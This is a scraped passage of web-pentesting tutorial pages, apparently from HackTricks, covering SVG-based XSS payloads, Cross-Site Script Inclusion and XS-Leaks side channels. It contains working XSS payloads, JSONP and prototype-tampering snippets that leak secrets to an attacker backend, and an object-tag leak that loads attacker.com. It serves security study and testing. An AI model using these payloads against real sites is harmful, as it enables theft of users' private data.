1.1//EN\"\n\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\n>\n<\nsvg\nversion\n=\n\"\n1.1\n\"\nbaseProfile\n=\n\"\nfull\n\"\nxmlns\n=\n\"\nhttp://www.w3.org/2000/svg\n\"\n>\n<\nrect\nwidth\n=\n\"\n300\n\"\nheight\n=\n\"\n100\n\"\nstyle\n=\n\"\nfill\n:\nrgb\n(\n0\n,\n0\n,\n255\n);\nstroke-width\n:\n3\n;\nstroke\n:\nrgb\n(\n0\n,\n0\n,\n0\n)\n\"\n/>\n<\nscript\ntype\n=\n\"\ntext/javascript\n\"\n>\nalert\n(\n1\n);\n</\nscript\n>\n</\nsvg\n>\n-----------------------------232181429808--\n<\nsvg\nversion\n=\n\"\n1.1\n\"\nbaseProfile\n=\n\"\nfull\n\"\nxmlns\n=\n\"\nhttp://www.w3.org/2000/svg\n\"\n>\n<\nscript\ntype\n=\n\"\ntext/javascript\n\"\n>\nalert\n(\n\"XSS\"\n)\n</\nscript\n>\n</\nsvg\n>\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!\nDOCTYPE\nsvg\nPUBLIC\n\"-//W3C//DTD SVG 1.1//EN\"\n\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\n>\n<\nsvg\nversion\n=\n\"\n1.1\n\"\nbaseProfile\n=\n\"\nfull\n\"\nxmlns\n=\n\"\nhttp://www.w3.org/2000/svg\n\"\n>\n<\npolygon\nid\n=\n\"\ntriangle\n\"\npoints\n=\n\"\n0,0 0,50 50,0\n\"\nfill\n=\n\"\n#009900\n\"\nstroke\n=\n\"\n#004400\n\"\n/>\n<\nscript\ntype\n=\n\"\ntext/javascript\n\"\n>\nalert\n(\n\"XSS\"\n);\n</\nscript\n>\n</\nsvg\n>\n<\nsvg\nwidth\n=\n\"\n500\n\"\nheight\n=\n\"\n500\n\"\nxmlns\n=\n\"\nhttp://www.w3.org/2000/svg\n\"\nxmlns:\nxlink\n=\n\"\nhttp://www.w3.org/1999/xlink\n\"\n>\n<\ncircle\ncx\n=\n\"\n50\n\"\ncy\n=\n\"\n50\n\"\nr\n=\n\"\n45\n\"\nfill\n=\n\"\ngreen\n\"\nid\n=\n\"\nfoo\n\"\n/>\n‚Äã\n<\nforeignObject\nwidth\n=\n\"\n500\n\"\nheight\n=\n\"\n500\n\"\n>\n<\niframe\nxmlns\n=\n\"\nhttp://www.w3.org/1999/xhtml\n\"\nsrc\n=\n\"\ndata:text/html,\n&lt;\nbody\n&gt;&lt;\nscript\n&gt;\ndocument.body.style.background=\n&quot;\nred\n&quot;&lt;\n/script\n&gt;\nhi\n&lt;\n/body\n&gt;\n\"\nwidth\n=\n\"\n400\n\"\nheight\n=\n\"\n250\n\"\n/>\n<\niframe\nxmlns\n=\n\"\nhttp://www.w3.org/1999/xhtml\n\"\nsrc\n=\n\"\njavascript:document.write('hi');\n\"\nwidth\n=\n\"\n400\n\"\nheight\n=\n\"\n250\n\"\n/>\n</\nforeignObject\n>\n</\nsvg\n>\n<\nsvg\n>\n<\nuse\nhref\n=\n\"\n//portswigger-labs.net/use_element/upload.php#x\n\"\n/>\n</\nsvg\n>\n<\nsvg\n>\n<\nuse\nhref=\"data:\nimage\n/\nsvg+xml,&lt;svg\nid\n=\n'\nx\n'\nxmlns\n=\n'\nhttp://www.w3.org/2000/svg\n'\n&gt;&lt;image\nhref\n=\n'\n1\n'\nonerror\n=\n'\nalert\n(\n1\n)\n'\n/\n&gt;&lt;\n/\nsvg&gt;#x\"\n/>\nFind\nmore SVG payloads in\nhttps://github.com/allanlw/svg-cheatsheet\n‚Äã\nMisc JS Tricks & Relevant Info\nMisc JS Tricks & Relevant Info\nXSS resources\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection\n‚Äã\n‚Äã\nhttp://www.xss-payloads.com\nhttps://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt\nhttps://github.com/materaj/xss-list\n‚Äã\n‚Äã\nhttps://github.com/ismailtasdelen/xss-payload-list\n‚Äã\n‚Äã\nhttps://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec\n‚Äã\n‚Äã\nhttps://netsec.expert/2020/02/01/xss-in-2020.html\n‚Äã\nXSS TOOLS\nFind some\ntools for XSS here\n.\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nXXE - XEE - XML External Entity\nNext\nAbusing Service Workers\nLast modified\n1mo ago"
    },
    {
        "title": "XSSI (Cross-Site Script Inclusion)",
        "url": "https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion",
        "text": "XSSI (Cross-Site Script Inclusion)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nThe information was taken from\nhttps://www.scip.ch/en/?labs.20160414\n‚Äã\nBasic Information\nXSSI designates a kind of vulnerability which exploits the fact that, when a\nresource is included using the\nscript\ntag, the SOP doesn‚Äôt apply\n, because scripts have to be able to be included cross-domain. An attacker can thus\nread everything\nthat was included using the\nscript\ntag\n.\nThis is especially interesting when it comes to dynamic JavaScript or JSONP when so-called ambient-authority information like cookies are used for authentication. The cookies are included when requesting a resource from a different host.\nTypes\n1.\nStatic JavaScript (regular XSSI)\n2.\nStatic JavaScript, which is only accessible when authenticated\n3.\nDynamic JavaScript\n4.\nNon-JavaScript\nRegular XSSI\nThe private information is located inside a global accessible JS file, you can just detect this by reading files, searching keywords or using regexps.\nTo exploit this, just include the script with private information inside the malicious content:\n<\nscript\nsrc\n=\n\"\nhttps://www.vulnerable-domain.tld/script.js\n\"\n>\n</\nscript\n>\n<\nscript\n>\nalert\n(\nJSON\n.\nstringify\n(\nconfidential_keys\n[\n0\n]));\n</\nscript\n>\nDynamic-JavaScript-based-XSSI and Authenticated-JavaScript-XSSI\nConfidential information is added to the script when a user requests it\n. This can be easily discovered by sending the request\nwith and without the cookies\n, if\ndifferent information\nis retrieved, then confidential information could be contained. To do this automatically you can use burp extension:\nhttps://github.com/luh2/DetectDynamicJS\n.\nIf the information resides inside a global variable, you you can exploit it using the same code as for the the previous case.\nIf the confidential data is sent inside a JSONP response, you can override the executed function to retrieve the information:\n<\nscript\n>\n//The confidential info will be inside the callback to angular.callbacks._7: angular.callbacks._7({\"status\":STATUS,\"body\":{\"demographics\":{\"email\":......}}})\nvar\nangular\n=\nfunction\n()\n{\nreturn\n1\n;\n};\nangular\n.\ncallbacks\n=\nfunction\n()\n{\nreturn\n1\n;\n};\nangular\n.\ncallbacks\n.\n_7\n=\nfunction\n(\nleaked\n)\n{\nalert\n(\nJSON\n.\nstringify\n(\nleaked\n));\n};\n</\nscript\n>\n<\nscript\nsrc\n=\n\"\nhttps://site.tld/p?jsonp=angular.callbacks._7\n\"\ntype\n=\n\"\ntext/javascript\n\"\n>\n</\nscript\n>\nOr you could also set a prepared function to be executed by the JSONP response:\n<\nscript\n>\nleak\n=\nfunction\n(\nleaked\n)\n{\nalert\n(\nJSON\n.\nstringify\n(\nleaked\n));\n};\n</\nscript\n>\n<\nscript\nsrc\n=\n\"\nhttps://site.tld/p?jsonp=leak\n\"\ntype\n=\n\"\ntext/javascript\n\"\n>\n</\nscript\n>\nIf a variable does not reside inside the global namespace, sometimes this can be exploited anyway using\nprototype tampering\n. Prototype tampering abuses the design of JavaScript, namely that when interpreting code, JavaScript traverses the prototype chain to find the called property. The following example is extracted from the paper\nThe Unexpected Dangers of Dynamic JavaScript\nand demonstrates how overriding a relevant function of type\nArray\nand access to\nthis\n, a non-global variable can be leaked as well.\n(\nfunction\n(){\nvar\narr\n=\n[\n\"secret1\"\n,\n\"secret2\"\n,\n\"secret3\"\n];\n// intents to slice out first entry\nvar\nx\n=\narr\n.\nslice\n(\n1\n);\n...\n})();\nIn the original code\nslice\nfrom type\nArray\naccesses the data we‚Äôre interested in. An attacker can, as described in the preceding clause, override\nslice\nand steal the secrets.\nArray\n.\nprototype\n.\nslice\n=\nfunction\n(){\n// leaks [\"secret1\", \"secret2\", \"secret3\"]\nsendToAttackerBackend\n(\nthis\n);\n};\nSecurity Researcher\nSebastian Lekies\njust recently updated his list of\nvectors\n.\nNon-Script-XSSI\nTakeshi Terada describes another kind of XSSI in his paper\nIdentifier based XSSI attacks\n. He was able to leak Non-Script files cross-origin by including, among others, CSV files as source in the\nscript\ntag, using the data as variable and function names.\nThe first publicly documented XSSI attack was in 2006. Jeremiah Grossman‚Äôs blog entry\nAdvanced Web Attack Techniques using GMail\ndepicts a XSSI, which by overriding the\nArray\nconstructor was able to read the complete address book of a google account.\nIn 2007 Joe Walker published\nJSON is not as safe as people think it is\n. He uses the same idea to steal JSON that is inside an\nArray\n.\nOther related attacks were conducted by injecting UTF-7 encoded content into the JSON to escape the JSON format. It is described by Gareth Heyes, author of\nHackvertor\n, in the blog entry\nJSON Hijacking\nreleased in 2011. In a quick test, this was still possible in Microsoft Internet Explorer and Edge, but not in Mozilla Firefox or Google Chrome.\nJSON with UTF-7:\n[{\n'friend'\n:\n'luke'\n,\n'email'\n:\n'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'\n}]\nIncluding the JSON in the attacker‚Äôs page\n<\nscript\nsrc\n=\n\"\nhttp://site.tld/json-utf7.json\n\"\ntype\n=\n\"\ntext/javascript\n\"\ncharset\n=\n\"\nUTF-7\n\"\n>\n</\nscript\n>\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nXSS Tools\nNext\n- Pentesting Web\nXS-Search/XS-Leaks\nLast modified\n6mo ago"
    },
    {
        "title": "XS-Search/XS-Leaks",
        "url": "https://book.hacktricks.xyz/pentesting-web/xs-search",
        "text": "XS-Search/XS-Leaks\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nXS-Search is a technique oriented to\nexfiltrate cross-origin information\nabusing\nside channel attacks\n.\nThere are different elements in this kind of attack:\nVulnerable Web\n: Is the web from where we want to exfiltrate some info\nAttacker's Web\n: Is the web the attacker creates containing the exploit and that the victim access\nInclusion Method\n: Is the method used to load the Vulnerable Web from the Attacker's web (like window.open, iframe, fetch, HTML tag with href...)\nLeak Technique\n: After accessing the vulnerable web, a technique will be used to differentiate between the potential status of the web with the information obtained from the inclusion method used.\nStates\n: The 2 possible states the vulnerable web can have depending on the victim that we want to differentiate.\nDetectable Differences\n: This is the information the attacker has to try to decide the status of the vulenrable web\nDetectable Diferences\nIn order to distinguish between the 2 states of the vulnerable page several things could be looked at:\nStatus Code\n. An attacker can distinguish\ndifferent HTTP response status codes\ncross-origin (e.g., server errors, client errors, or authentication errors).\nAPI Usage\n. This detectable difference allows an attacker to detect\nWeb APIs‚Äô usage\nacross pages, allowing an attacker to infer whether a cross-origin page is using a specific JavaScript Web API.\nRedirects\n. It is possible to detect if a web application has\nnavigated the user to a different page\n. This is not limited to HTTP redirects but also includes redirects triggered by JavaScript or HTML.\nPage Content\n. These detectable\ndifferences appear in the HTTP response body\nitself or in sub-resources included by the page. For example, this could be the\nnumber of included frames\n(cf. XS-Leak on Gitlab) or size differences of images.\nHTTP Header\n. An attacker can detect the presence of a\nspecific HTTP response header\nand may be able to gather its value. This includes headers such as X-Frame-Options, Content-Disposition, and Cross-Origin-Resource-Policy.\nTiming\n: An attacker can detect that a consistent time difference exists between 2 states.\nInclusion Methods\nHTML Elements\n. HTML offers a variety of elements that enable\ncross-origin resource inclusion\n. Elements like stylesheets, images, or scripts, force the victim‚Äôs browser to request a specified non-HTML resource. A list that enumerates possible HTML elements for this purpose is available online (\nhttps://github.com/cure53/HTTPLeaks\n).\nFrames\n. Elements such as\niframe\n,\nobject\n, and\nembed\nmay embed further HTML resources directly into the attacker page. If the page does\nnot use framing protection\n, JavaScript code can access the framed resource‚Äôs window object via the contentWindow property.\nPop-ups\n. The\nwindow.open\nmethod loads a resource in a new browser tab or window. The method returns a\nwindow handle\nthat JavaScript code can use to access methods and properties, which comply with the SOP. These so-called pop-ups are often used in single sign-on. Modern browsers only allow pop-ups if they are triggered by certain user interactions. For XS-Leak attacks, this method is especially helpful because it\nbypasses framing and cookie restrictions for a target resource\n. Newer browser versions recently added means to isolate window handles.\nJavaScript Requests\n. JavaScript allows sending requests to target resources directly. There are two different ways for this purpose:\nXMLHttpRequests\nand its successor\nFetch\nAPI\n. In contrast to previous inclusion methods, an attacker has fine-grained control over the issued request, for example, whether an HTTP redirect must be automatically followed.\nLeak Techniques\nEvent Handler\n. Event handler can be seen as the classical leak technique for XS-Leaks. They are a well-known source of various pieces of information. For example, the trigger of\nonload\nindicates a\nsuccessful\nresource loading in contrast to the onerror event.\nError Messages\n. Beyond event handlers, error messages can occur as\nJavaScript exceptions\nand\nspecial error pages\n. Error messages can be thrown in different steps, for example, directly by the leak technique. The leak technique can either use additional\ninformation\ndirectly\ncontained\nin the\nerror message\n, or distinguish between the\nappearance and absence of an error message\n.\nGlobal Limits\n. Every computer has its physical limits, so does a browser. For example, the amount of available memory limits a browser‚Äôs running tabs. The same holds for other browser limits that are enforced for the entire browser. If an attacker can determine\nwhen the limit is reached this can be used as a leak technique\n.\nGlobal State\n. Browsers have\nglobal states that all pages can interact with\n. If this interaction is detectable from an attacker‚Äôs website, it can be used as a leak technique. For example, the\nHistory\ninterface allows manipulation of the pages visited in a tab or frame. This creates a global state because the\nnumber of entries\nallows an attacker to draw conclusions about cross-origin pages.\nPerformance API\n. The Performance API is used to access the\nperformance information of the current page\n. Their entries include detailed network timing data for the document and every resource loaded by the page. This allows an attacker to draw\nconclusions about requested resources\n. For example, we identified cases where browsers will not create performance entries for some requests.\nReadable Attributes\n. HTML has several\nattributes that are readable cross-origin\n. This read access can be used as a leak technique. For example, JavaScript code can read the number of frames included in a webpage cross-origin with the window.frame.length property.\nTiming Based techniques\nSome of the following techniques are going to use timing to as part of the process to detect differences in the possible states of the web pages. There are different ways to measure time in a web browser.\nClocks\n: The\nperformance.now()\nAPI allows developers to get high-resolution timing measurements.\nThere are a considerable number of APIs attackers can abuse to create implicit clocks:\nBroadcast Channel API\n,\nMessage Channel API\n,\nrequestAnimationFrame\n,\nsetTimeout\n, CSS animations, and others.\nFor more info:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/clocks\n.\nXSinator\nXSinator is an automatic tool to\ncheck browsers against several know XS-Leaks\nexplained in its paper:\nhttps://xsinator.com/paper.pdf\nYou can access the tool in\nhttps://xsinator.com/\n‚Äã\nExcluded XS-Leaks\n: We had to exclude XS-Leaks that rely on\nservice workers\nas they would interfere with other leaks in XSinator. Furthermore, we chose to\nexclude XS-Leaks that rely on misconfiguration and bugs in a specific web application\n. For example, CrossOrigin Resource Sharing (CORS) misconfigurations, postMessage leakage or Cross-Site Scripting. Additionally, we excluded timebased XS-Leaks since they often suffer from being slow, noisy and inaccurate.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nEvent Handler Techniques\nOnload/Onerror\nInclusion Methods\n: Frames, HTML Elements\nDetectable Difference\n: Status Code\nMore info\n:\nhttps://www.usenix.org/conference/usenixsecurity19/presentation/staicu\n,\nhttps://xsleaks.dev/docs/attacks/error-events/\n‚Äã\nSummary\n: if trying to load a resource onerror/onload events are triggered with the resource is loaded successfully/unsuccessfully it's possible to figure out the status code.\nCode example\n:\nhttps://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)\n‚Äã\nCookie Bomb + Onerror XS Leak\nThe code example try lo\nload scripts objects from JS\n, but\nother tags\nsuch as objects, stylesheets, images, audios could be also used. Moreover, it's also possible to inject the\ntag directly\nand declare the\nonload\nand\nonerror\nevents inside the tag (instead of injecting it from JS).\nThere is also a script-less version of this attack:\n<\nobject\ndata\n=\n\"\n//example.com/404\n\"\n>\n<\nobject\ndata\n=\n\"\n//attacker.com/?error\n\"\n>\n</\nobject\n>\n</\nobject\n>\nIn this case if\nexample.com/404\nis not found\nattacker.com/?error\nwill be loaded.\nOnload Timing\nInclusion Methods\n: HTML Elements\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events\n‚Äã\nSummary:\nThe ****\nperformance.now()\nAPI\ncan be used to measure how much time it takes to perform a request. However, other clocks could be used, such as\nPerformanceLongTaskTiming API\nwhich can identify tasks running for more than 50ms.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events\nanother example in:\nperformance.now example\nOnload Timing + Forced Heavy Task\nThis technique is just like the previous one, but the\nattacker\nwill also\nforce\nsome action to take a\nrelevant amount time\nwhen the\nanswer is positive or negative\nand measure that time.\nperformance.now + Force heavy task\nunload/beforeunload Timing\nInclusion Methods\n: Frames\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events\n‚Äã\nSummary:\nThe\nSharedArrayBuffer clock\ncan be used to measure how much time it takes to perform a request. Other clocks could be used.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events\n‚Äã\nThe\nunload\nand\nbeforeunload\nevents can be used to measure the time it takes to fetch a resource. This works because\nbeforeunload\nis triggered when the browser\nrequests a new navigation\nrequest, while\nunload\nis triggered when that\nnavigation actually occurs\n. Because of this behaviour, it is possible to calculate the time difference between these two events and measure the\ntime it took the browser to complete fetching the resource\n.\nSandboxed Frame Timing + onload\nInclusion Methods\n: Frames\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks\n‚Äã\nSummary:\nThe\nperformance.now()\nAPI can be used to measure how much time it takes to perform a request. Other clocks could be used.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks\n‚Äã\nIf a page doesn‚Äôt have any\nFraming Protections\nimplemented, an attacker can time how long it takes for the page and all subresources to load over the network. By default, the\nonload\nhandler for an iframe is invoked after all the resources have been loaded and all JavaScript has finished executing. But, an attacker can eliminate the noise of script execution by including the\nsandbox\nattribute in the\n<iframe>\n. This attribute blocks a lot of features including JavaScript execution, which results in almost pure network measurement.\n#ID + error + onload\nInclusion Methods\n: Frames\nDetectable Difference\n: Page Content\nMore info\n:\nSummary\n: If you can make the page error when the correct content is accessed and make it load correctly when any content is accessed, then you can make a loop to extract all the information without measuring the time.\nCode Example\n:\nSuppose that you can\ninsert\nthe\npage\nthat has the\nsecret\ncontent\ninside an Iframe\n.\nYou can\nmake the victim search\nfor the file that contains \"\nflag\n\" using an\nIframe\n(exploiting a CSRF for example). Inside the Iframe you know that the\nonload event\nwill be\nexecuted always at least once\n. Then, you can\nchange\nthe\nURL\nof the\niframe\nbut changing only the\ncontent\nof the\nhash\ninside the URL.\nFor example:\n1.\nURL1\n: www.attacker.com/xssearch#try1\n2.\nURL2\n: www.attacker.com/xssearch#try2\nIf the first URL was\nsuccessfully loaded\n, then, when\nchanging\nthe\nhash\npart of the URL the\nonload\nevent\nwon't be triggered\nagain. But\nif\nthe page had some kind of\nerror\nwhen\nloading\n, then, the\nonload\nevent will be\ntriggered again\n.\nThen, you can\ndistinguish between\na\ncorrectly\nloaded page or page that has an\nerror\nwhen is accessed.\nJavascript Execution\nInclusion Methods\n: Frames\nDetectable Difference\n: Page Content\nMore info\n:\nSummary:\nIf the\npage\nis\nreturning\nthe\nsensitive\ncontent,\nor\na\ncontent\nthat can be\ncontrolled\nby the user. The user could set\nvalid JS code in the negative case\n, an\nload\neach try inside\n<script>\ntags, so in\nnegative\ncases attackers\ncode\nis\nexecuted,\nand in\naffirmative\ncases\nnothing\nwill be executed.\nCode Example:\nJavaScript Execution XS Leak\nCORB - Onerror\nInclusion Methods\n: HTML Elements\nDetectable Difference\n: Status Code & Headers\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/browser-features/corb/\n‚Äã\nSummary\n: Attackers can observe when CORB is enforced if a response returns a\nCORB protected\nContent-Type\n(and\nnosniff\n) with the status code\n2xx\nwhich results in CORB stripping the body and headers from the response. Detecting this protection allows an attacker to\nleak\nthe combination of both the\nstatus code\n(success vs. error) and the\nContent-Type\n(protected by CORB or not).\nCode Example:\nCheck the more information link for more information about the attack.\nonblur\nInclusion Methods\n: Frames\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/id-attribute/\n,\nhttps://xsleaks.dev/docs/attacks/experiments/portals/\n‚Äã\nSummary\n: Leak sensitive data from the id or name attribute.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/id-attribute/#code-snippet\n‚Äã\nIt's possible to\nload a page\ninside an\niframe\nand use the\n#id_value\nto make the page\nfocus on the element\nof the iframe with indicated if, then if an\nonblur\nsignal is triggered, the ID element exists.\nYou can perform the same attack with\nportal\ntags.\npostMessage Broadcasts\nInclusion Methods\n: Frames, Pop-ups\nDetectable Difference\n: API Usage\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/postmessage-broadcasts/\n‚Äã\nSummary\n: Gather sensitive information from a postMessage or use the presence of postMessages as an oracle to know the status of the user in the page\nCode Example\n:\nAny code listening for all postMessages.\nApplications often use\npostMessage broadcasts\nto share information with other origins. Listening to this messages one could find\nsensitive info\n(potentially if the the\ntargetOrigin\nparam is not used). Also, the fact of receiving some message can be\nused as an oracle\n(you only receive this kind of message if you are logged in).\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nGlobal Limits Techniques\nWebSocket API\nInclusion Methods\n: Frames, Pop-ups\nDetectable Difference\n: API Usage\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.1)\nSummary\n: Exhausting the WebSocket connection limit leaks the number of WebSocket connections of a cross-origin page.\nCode Example\n:\nhttps://xsinator.com/testing.html#WebSocket%20Leak%20(FF)\n,\nhttps://xsinator.com/testing.html#WebSocket%20Leak%20(GC)\n‚Äã\nIt is possible to identify if, and how many,\nWebSocket connections a target page uses\n. It allows an attacker to detect application states and leak information tied to the number of WebSocket connections.\nIf one\norigin\nuses the\nmaximum amount of WebSocket\nconnection objects, regardless of their connections state, the creation of\nnew objects will result in JavaScript exceptions\n. To execute this attack, the attacker website opens the target website in a pop-up or iframe and then, after the target web has been loaded, attempts to create the maximum number of WebSockets connections possible. The\nnumber of thrown exceptions\nis the\nnumber of WebSocket connections used by the target website\nwindow.\nPayment API\nInclusion Methods\n: Frames, Pop-ups\nDetectable Difference\n: API Usage\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.1)\nSummary\n: Detect Payment Request because only one can be active at a time.\nCode Example\n:\nhttps://xsinator.com/testing.html#Payment%20API%20Leak\n‚Äã\nThis XS-Leak enables an attacker to\ndetect when a cross-origin page initiates a payment request\n.\nBecause\nonly one request payment can be active\nat the same time, if the target website is using the Payment Request API, any f\nurther attempts to show use this API will fail\n, and cause a\nJavaScript exception\n. The attacker can exploit this by\nperiodically attempting to show the Payment API UI\n. If one attempt causes an exception, the target website is currently using it. The attacker can hide these periodical attempts by immediately closing the UI after creation.\nTiming the Event Loop\nInclusion Methods\n:\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop\n‚Äã\nSummary:\nMeasure execution time of a web abusing the single-threaded JS event loop.\nCode Example\n:\nEvent Loop Blocking + Lazy images\nJavaScript‚Äôs concurrency model is based on a\nsingle-threaded event loop\nwhich means\nit can only run one task at a time\n.\nInferring\nhow long code from a different origin takes to run\nby measuring how long it t\nakes to run next in the event pool\n. The attacker keeps sending events to the event loop with fixed properties, which will eventually be dispatched if the pool is empty. Other origins dispatch events to the same pool, and this is where an\nattacker infers the time difference by detecting if a delay occurred with one of its tasks\n.\nIn an execution timing it's possible to\neliminate\nnetwork factors\nto obtain\nmore precise measurements\n. For example, by loading the resources used by the page before loading it.\nBusy Event Loop\nInclusion Methods\n:\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop\n‚Äã\nSummary:\nMeasure execution time of a web locking the event loop of a thread and timing\nhow long it takes for the event loop to become available again\n.\nCode Example\n:\nOne of the main advantages of this technique is its ability to circumvent Site Isolation, as an attacker origin can influence the execution of another origin.\nIn an execution timing it's possible to\neliminate\nnetwork factors\nto obtain\nmore precise measurements\n. For example, by loading the resources used by the page before loading it.\nConnection Pool\nInclusion Methods\n: JavaScript Requests\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/\n‚Äã\nSummary:\nAn attacker could lock all the sockets except 1, load the target web and at the same time load another page, the time until the last page is starting to load is the time the target page took to load.\nCode Example\n:\nConnection Pool Examples\nBrowsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources,\nbrowsers have to impose a limit\n. To exploit the existence of this limit, attackers can:\n1.\nCheck what the limit of the browser is, for example 256 global sockets.\n2.\nBlock 255 sockets for a long period of time by performing 255 requests to different hosts that simply hang the connection\n3.\nUse the 256th socket by performing a request to the target page.\n4.\nPerform a 257th request to another host. Since all the sockets are being used (in steps 2 and 3), this request must wait until the pool receives an available socket. This waiting period provides the attacker with the network timing of the 256th socket, which belongs to the target page. This works because the 255 sockets in step 2 are still blocked, so if the pool received an available socket, it was caused by the release of the socket in step 3. The time to release the 256th socket is directly connected with the time taken to complete the request.\nFor more info:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/\n‚Äã\nConnection Pool by Destination\nInclusion Methods\n: JavaScript Requests\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nSummary:\nIt's like the previous technique but instead of using all the sockets, Google\nChrome\nputs a limit of\n6 concurrent request to the same origin\n. If we\nblock 5\nand then\nlaunch a 6th\nrequest we 